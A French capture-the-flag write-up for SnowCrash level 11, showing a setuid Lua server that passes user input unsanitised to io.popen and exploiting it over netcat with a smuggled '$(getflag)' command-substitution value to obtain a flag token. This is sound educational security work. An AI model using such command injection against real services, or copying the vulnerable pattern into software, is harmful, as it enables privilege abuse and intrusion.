# LEVEL11

Le système de fichier se présente de cette manière:

``` bash
level11@SnowCrash:~$ ls -la
total 16
dr-xr-x---+ 1 level11 level11  120 Mar  5  2016 .
d--x--x--x  1 root    users    340 Aug 30  2015 ..
-r-x------  1 level11 level11  220 Apr  3  2012 .bash_logout
-r-x------  1 level11 level11 3518 Aug 30  2015 .bashrc
-rwsr-sr-x  1 flag11  level11  668 Mar  5  2016 level11.lua
-r-x------  1 level11 level11  675 Apr  3  2012 .profile

```

``` bash
cat level11.lua
```
``` lua

#!/usr/bin/env lua
local socket = require("socket")
local server = assert(socket.bind("127.0.0.1", 5151))

function hash(pass)
  prog = io.popen("echo "..pass.." | sha1sum", "r")
  data = prog:read("*all")
  prog:close()

  data = string.sub(data, 1, 40)

  return data
end


while 1 do
  local client = server:accept()
  client:send("Password: ")
  client:settimeout(60)
  local l, err = client:receive()
  if not err then
      print("trying " .. l)
      local h = hash(l)

      if h ~= "f05d1d066fb246efe0c6f7d095f909a7a0cf34a0" then
          client:send("Erf nope..\n");
      else
          client:send("Gz you dumb*\n")
      end

  end

  client:close()
end

```

Le script lua crée un serveur à l'adresse de localhost sur lequel on peut se connecter avec le port 5151.
Le serveur est déjà lancé quand on veut lancer le script lua:

``` bash
level11@SnowCrash:~$ lua level11.lua
lua: level11.lua:3: address already in use
stack traceback:
	[C]: in function 'assert'
	level11.lua:3: in main chunk
	[C]: ?
```

Adress already in use fait reference au couple 127.0.0.1 5151
L'utilisation de ps aux permet de voir qu'un processus est effectivement lancé à partir du fichier.
On veut voir quel process est en cours et qui occupe le port 5151 


``` bash
level11@SnowCrash:~$ ps aux | grep lua
flag11    1827  0.0  0.0   2892   828 ?        S    11:35   0:00 lua /home/user/level11/level11.lua
level11   2214  0.0  0.0   4380   820 pts/1    S+   15:02   0:00 grep --color=auto lua


level11@SnowCrash:~$ nc -l 5151
nc: Address already in use

```

On va donc se connecteer au serveur avec nc, l'adresse et le port:
(On ne veut pas juste ecouter sur le serveur mais cette fois ci envoyer dans donnees donc on utilise pas le flag -l)


``` bash
level11@SnowCrash:~$ nc 127.0.0.1 5151
Password: f05d1d066fb246efe0c6f7d095f909a7a0cf34a0
Erf nope..
```

``` bash
level11@SnowCrash:~$ nc 127.0.0.1 5151
Password: $(getflag) > /tmp/teest
Erf nope..
level11@SnowCrash:~$ cat /tmp/teest
Check flag.Here is your token : fa6v5ateaw21peobuub8ipe6s
```


-> shell command injection
-> command substitution
-> shell metacharacterers
-> io.popen security vulnerabilities

Commandes utiles:
  - ss -ltnp
  - netstat -tuln
  - lsof